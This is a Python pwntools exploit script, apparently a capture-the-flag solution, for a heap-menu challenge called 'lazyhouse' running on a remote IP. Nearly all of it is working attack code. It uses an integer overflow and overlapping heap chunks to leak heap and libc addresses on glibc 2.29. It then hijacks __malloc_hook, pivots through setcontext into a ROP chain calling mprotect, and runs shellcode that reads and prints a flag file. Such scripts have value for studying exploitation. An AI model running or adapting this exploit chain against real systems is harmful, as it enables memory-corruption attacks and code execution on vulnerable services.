from pwn import *

context.arch = 'amd64'

###Util
def create(idx,size,data):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.sendafter('House:',data)

def create_fail(idx,size):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))

def show(idx):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Index:',str(idx))
    return r.recvuntil('$$$$$$$$',drop=True)

def delete(idx):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('Index:',str(idx))

def edit(idx,data):
    r.sendlineafter('choice: ','4')
    r.sendlineafter('Index:',str(idx))
    r.sendafter('House:',data)

def create_special(data):
    r.sendlineafter('choice: ','5')
    r.sendafter('House:',data)

def replenish_money(idx):
    create_fail(idx,((1<<64)//0xda)+1)
    delete(idx)

###Addr
#  libc2.29
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
malloc_hook_offset = 0x1e4c30

###ROPgadget
L_pop_rax = 0x47cf8
L_pop_rdi = 0x26542
L_pop_rsi = 0x26f9e
L_pop_rdx = 0x12bda6
L_syscall = 0xcf6c5
L_nop = 0x3148f
L_setcontext = 0x55e35
'''
The setcontext function acts pretty much like calling sigreturn, but involves no syscall, and helps set all registers
0x55e35
   mov    rsp,QWORD PTR [rdx+0xa0]
   mov    rbx,QWORD PTR [rdx+0x80]
   mov    rbp,QWORD PTR [rdx+0x78]
   mov    r12,QWORD PTR [rdx+0x48]
   mov    r13,QWORD PTR [rdx+0x50]
   mov    r14,QWORD PTR [rdx+0x58]
   mov    r15,QWORD PTR [rdx+0x60]
   mov    rcx,QWORD PTR [rdx+0xa8]
   push   rcx
   mov    rsi,QWORD PTR [rdx+0x70]
   mov    rdi,QWORD PTR [rdx+0x68]
   mov    rcx,QWORD PTR [rdx+0x98]
   mov    r8,QWORD PTR [rdx+0x28]
   mov    r9,QWORD PTR [rdx+0x30]
   mov    rdx,QWORD PTR [rdx+0x88]
   xor    eax,eax
   ret
'''
L_call_rel_rbp = 0x10f9b5
'''
0x10f9b5
    mov    rax,QWORD PTR [rbp-0xf8]
    lea    rcx,[rbp-0x108]
    mov    rsi,QWORD PTR [rbp-0x140]
    mov    rdi,QWORD PTR [rbp-0x118]
    mov    edx,DWORD PTR [rax+0x18]
    call   QWORD PTR [rbp-0xf0]
'''
L_mov_rdx_rax_call = 0x127018
'''
0x127018
    mov    rdx,rax
    call   QWORD PTR [rbp+0x28]
'''


###Exploit
r = remote('3.115.121.123',5731)
replenish_money(0)

create(0,0x88,'M30W')
create(1,0x98,'M30W')
create(2,0x418,'M30W')
create(6,0x88,'M30W')

create(4,0x398,'M30W')
delete(4)
for i in range(4):
    create(4,0x3a8,'M30W')
    delete(4)
for i in range(7):
    create(4,0x98,'M30W')
    delete(4)
for i in range(4):
    create(4,0x88,'M30W')
    delete(4)

edit(0,b'\x00'*0x88+p64(0x4c1))
delete(1)
create(1,0x4b8,b'\x00'*0x98+p64(0x421))
delete(0)
delete(2)
create(5,0xb8,'M30W')
delete(5)
create(0,0x88,'M30W')
create(2,0x88,'M30W')
create(3,0x88,'M30W')
create(4,0x88,'M30W')
delete(4)
leaks = show(1)
heap_addr = u64(leaks[0x310:0x318])-0x260
print(hex(heap_addr))
unsorted_bin_addr = u64(leaks[0x3a0:0x3a8])
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))
delete(6)
create(4,0x118,'M30W')

delete(1)
create(1,0x4b8,b'\x00'*0x90+\
               p64(0)+p64(0xc1)+b'\x00'*0xb0+\
               p64(0)+p64(0x91)+b'\x00'*0x80+\
               p64(0)+p64(0x21)+b'\x00'*0x80+\
               p64(0)+p64(0x31))
delete(2)
delete(3)

delete(1)
create(1,0x4b8,b'\x00'*0x90+\
               p64(0)+p64(0xc1)+b'\x00'*0xb0+\
               p64(0x400)+p64(0x90)+b'\x00'*0x80+\
               p64(0)+p64(0xa1)+p64(0)+p64(0x91)+p64(0)+p64(heap_addr+0x40)+b'\x00'*0x60+\
               p64(0)*3+p64(0x81)+p64(heap_addr+0x40)+p64(0)+b'\x00'*0x60+\
               p64(0)+p64(0x91)+b'\x00'*0x80+\
               p64(0)+p64(0x121))
delete(0)

delete(4)

indirect_call_param = (p64(heap_addr+0x2340)+p64(libc_base+L_mov_rdx_rax_call)).ljust(0x120,b'\x00')+p64(libc_base+L_setcontext)
fake_register_frame = b'\x00'*0xa0+p64(heap_addr+0x2440)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rsi)+p64(0x21000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr+0x24c0)
#argument = b'/proc/self/maps'.ljust(0x30,b'\x00')
argument = b'/home/lazyhouse/flag'.ljust(0x30,b'\x00')
shellcode = asm(f'''
                mov rdi, {heap_addr+0x2490}
                mov rsi, 0
                mov rdx, 0
                mov rax, 2
                syscall
                mov rdi, 3
                mov rsi, {heap_addr}
                mov rdx, 0x200
                mov rax, 0
                syscall
                mov rdi, 1
                mov rsi, {heap_addr}
                mov rdx, 0x200
                mov rax, 1
                syscall
                hlt
                ''')
payload = indirect_call_param.ljust(0x200,b'\x00')+fake_register_frame.ljust(0x100,b'\x00')+ROPchain+argument+shellcode

### 0x217 is so large that creating special chunk at malloc_hook will either overlap and clear stdin FILE before it or main_arena after it
### But since there are no input that depends on stdin stream functions in this problem, we actually don't care about it at all
create(0,0x488,b'\x00'*0x100+p64(libc_base+malloc_hook_offset-0x200))

create(2,0x400,payload)
create_special(b'a'*0x200+p64(libc_base+L_call_rel_rbp))

create_fail(3,heap_addr+0x2140+0xf8)

r.interactive()
